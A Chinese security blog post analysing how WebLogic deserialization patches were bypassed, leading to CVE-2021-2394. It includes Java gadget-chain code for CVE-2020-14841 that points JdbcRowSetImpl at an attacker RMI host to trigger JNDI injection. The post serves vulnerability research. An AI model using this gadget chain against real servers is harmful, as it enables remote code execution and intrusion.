前几天weblogic
7月例行更新中，修复了一个Rce漏洞。该漏洞性质属于绕过之前的反序列化漏洞补丁。要了解这个漏洞的原因，我们首先要学习其他几个漏洞的原理。

## 一 weblogic 反序列化绕过指南

本章节只是大概讲解一下如何绕过weblogic反序列化漏洞的补丁。

序列化和反序列化是将一个对象从本机JVM中传输到远程JVM上。在java
序列化的时候，会将对象的类名也写入到传输的数据中。反序列化的时候首先从数据中读取类名，然后通过反射，根据类名去实例化这个对象。类通过实现java.io.Serializable接口可以启用其序列化功能。未实现次接口的类无法使其任何状态序列化或反序列化。可序列化类的所有子类型本身都是可序列化的。序列化接口没有方法或字段，仅用于标识可序列化的语义。

一个类如果想被序列化，那么它可以继承自两个接口，这两个接口的对比如下。

区 别| Serializable| Externalizable  
---|---|---  
实现复杂度| 实现简单，Java对其有内建支持| 实现复杂，由开发人员自己完成  
执行效率| 所有对象由Java统一保存，性能较低| 开发人员决定哪个对象保存，可能造成速度提升  
保存信息| 保存时占用空间大| 部分存储，可能造成空间减少  
  
​而在weblogic的T3协议中，就是用java的序列化协议互相传输对象。为了保证安全性，T3协议的反序列化黑名单中标识哪些类不可以被反序列化。所以weblogic补丁绕过总共有下面几种办法

### 1.1 黑名单没有覆盖的类

weblogic的开发没有主管能动性，对于安全态度十分消极。只有有人上报CVE，他才会动手加黑名单。否则绝对不会做任何事情。而且对于黑名单经常漏加，造成很多绕过案例。

### 1.2 利用未经过滤的ObjectInputStream绕过绕过

在之前的公众号讲过，在weblogic中某些类继承自Externalizable接口，在反序列化的时候默认会调用`readExternal`方法。在该方法中没有使用weblogic提供的带有黑名单过滤功能的FilterInputStream去还原类。而是自作主张，自己使用了没有黑名单过滤的ObjectInputStream去还原对象。造成黑名单根本就没用上，例如CVE-2020-2551
就是这种情况。

当然这只是一个大概，并没有很详细，我们这篇文章的重点不在此。

## 3\. CVE-2020-14841 Jndi注入漏洞

在`oracle.eclipselink.coherence.integrated.internal.cache.LockVersionExtractor`中，代码如下

    
    
    public Object extract(Object arg0) {
            if (arg0 == null) {
                return null;
            } else {
                if (arg0 instanceof Wrapper) {
                    arg0 = ((Wrapper)arg0).unwrap();
                }
    
    
                if (!this.accessor.isInitialized()) {
                    this.accessor.initializeAttributes(arg0.getClass());
                }
    
    
                return this.accessor.getAttributeValueFromObject(arg0);
            }
        }
    

我们可以从代码上看出来，类似与
cve-2020-2555，用法也都是一样的。触发漏洞的重点在于this.accessor.getAttributeValueFromObject
中。对于这个漏洞，我们一般使用MethodAttributeAccessor这个类去触发漏洞

相关代码如下

    
    
    public class MethodAttributeAccessor extends AttributeAccessor {
        protected String setMethodName = "";
        protected String getMethodName;
        protected transient Method setMethod;
        protected transient Method getMethod;
    
        protected Object getAttributeValueFromObject(Object anObject, Object[] parameters) throws DescriptorException {
            try {
                if (PrivilegedAccessHelper.shouldUsePrivilegedAccess()) {
                    try {
                        return AccessController.doPrivileged(new PrivilegedMethodInvoker(this.getGetMethod(), anObject, parameters));
                } else {
                    return this.getMethod.invoke(anObject, parameters);
                }
    

下面我们选取一条Gadget。在反序列化的Gadget中，单纯通过反序列化还原一个类是没有办法触发漏洞，一般都一条链条去触发。所以我们选取下面的cve-2020-14645
的Gadget，代码如下

    
    
    // JdbcRowSetImpl
            JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
            jdbcRowSet.setDataSourceName("rmi://192.168.3.254:8888/xsmd");
    
            MethodAttributeAccessor methodAttributeAccessor = new MethodAttributeAccessor();
            methodAttributeAccessor.setGetMethodName("getDatabaseMetaData");
            methodAttributeAccessor.setIsWriteOnly(true);
            methodAttributeAccessor.setAttributeName("UnicodeSec");
    
    
            LockVersionExtractor extractor = new LockVersionExtractor(methodAttributeAccessor, "UnicodeSec");
    
            final ExtractorComparator comparator = new ExtractorComparator(extractor);
            final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
    
    
            Object[] q = new Object[]{jdbcRowSet, jdbcRowSet};
            Reflections.setFieldValue(queue, "queue", q);
            Reflections.setFieldValue(queue, "size", 2);
    
            Field comparatorF = queue.getClass().getDeclaredField("comparator");
            comparatorF.setAccessible(true);
            comparatorF.set(queue, new ExtractorComparator(extractor));
    

注意，在反序列化Gadget中，必须所有类都可以被反序列化。

Weblogic的修复思路也比较清奇，只是将LockVersionExtractor与MethodAttributeAccessor类加入到黑名单中。但是LockVersionExtractor旁边还有一个FilterExtractor类，同样可以触发该漏洞，但是weblogic却没有将其加入到黑名单中。这也为cve-2021-2394埋下了伏笔

## 3\. cve-2020-14756分析

weblogic
偏偏又搞出一套属于自己的反序列化方案。在coherence包中继承自`com.tangosol.io.ExternalizableLite`的类同样可以被反序列化。我们看一下`com.tangosol.io.ExternalizableLite`的具体代码。

    
    
    public interface ExternalizableLite extends Serializable {
        void readExternal(DataInput var1) throws IOException;
    
        void writeExternal(DataOutput var1) throws IOException;
    }
    

虽然他这个接口也存在readExternal方法，但是方法的参数类型与java.io.Externalizable接口的readExternal方法的参数类型不同。所以对于继承自`com.tangosol.io.ExternalizableLite`的类，在反序列化的时候并不会主动调用其readExternal方法。而是像继承自java.io.serializable接口的类一样，还原所有属性。

但是我们要想办法调用`com.tangosol.io.ExternalizableLite`的readExternal方法，在很多继承自该接口的类中都重写了该方法，而且有很多注入绕过weblogic黑名单的敏感操作。  
在`com.tangosol.coherence.servlet.AttributeHolder`类中，java原生的序列化与反序列化默认会调用`readExternal(ObjectInput
in)`方法，恰好又调用了`readExternal(DataInput
in)`方法。方法代码如下，第三行中使用`ExternalizableHelper.readObject`从流中还原一个对象

    
    
    public void readExternal(DataInput in) throws IOException {
            this.m_sName = ExternalizableHelper.readUTF(in);
            this.m_oValue = ExternalizableHelper.readObject(in);
            this.m_fActivationListener = in.readBoolean();
            this.m_fBindingListener = in.readBoolean();
            this.m_fLocal = in.readBoolean();
        }
    

在`ExternalizableHelper.readObject`方法中实际调用`ExternalizableHelper.readObjectInternal`方法去还原一个对象，代码如下  
![image.png](https://image.3001.net/images/20210726/1627280839_60fe55c73e0ea76b678bc.png!small)

在这里根据对象的类型，调用相关函数去还原。对于继承自`com.tangosol.io.ExternalizableLite`的类，由readExternalizableLite方法去处理，实例化相关对象后，再调用类的readExtrenal方法。  
![image.png](https://image.3001.net/images/20210726/1627280851_60fe55d3655006f35e696.png!small)

在这里，读取类名将其实例化。在这最关键的一步，缺少了黑名单的过滤。

weblogic的修复方法也很简单，那就是直接弄个黑名单过滤，代码如下，黑名单其实就是  
![image.png](https://image.3001.net/images/20210726/1627280856_60fe55d822195500682d1.png!small)

## 4\. cve-2021-2394 分析

说了上面这两个漏洞，终于可以引出下面这个漏洞了。这个漏洞其实是CVE-2020-14841与cve-2020-14756的结合体。在cve-2020-14841中最为关键的两个类目前已经加入黑名单套餐。其中LockVersionExtractor可以使用FilterExtractor代替。那么MethodAttributeAccessor如何代替。

答案在`oracle.eclipselink.coherence.integrated.internal.cache.SerializationHelper#readAttributeAccessor(java.io.DataInput)`中，代码如图。在这个方法中实例化一个MethodAttributeAccessor对象。我们只需要寻找在反序列化过程中是谁调用该方法，即可不通过反序列化去生成MethodAttributeAccessor对象

![image.png](https://image.3001.net/images/20210726/1627280862_60fe55dea5667aeae345b.png!small)

巧合的是，FilterExtractor中，正好会通过readAttributeAccessor去还原MethodAttributeAccessor对象。FilterExtractor对象也恰好继承自`com.tangosol.io.ExternalizableLite`方法。而触发readAttributeAccessor的方法恰好是重写自接口的方法。

我们只需要通过cve-2020-14756前半部分触发漏洞即可。十分简单，代码如下  
![](https://image.3001.net/images/20210726/1627280864_60fe55e0bb51671683566.png!small)

![](https://image.3001.net/images/20210726/1627280865_60fe55e19bb504ebcca9c.png!small)

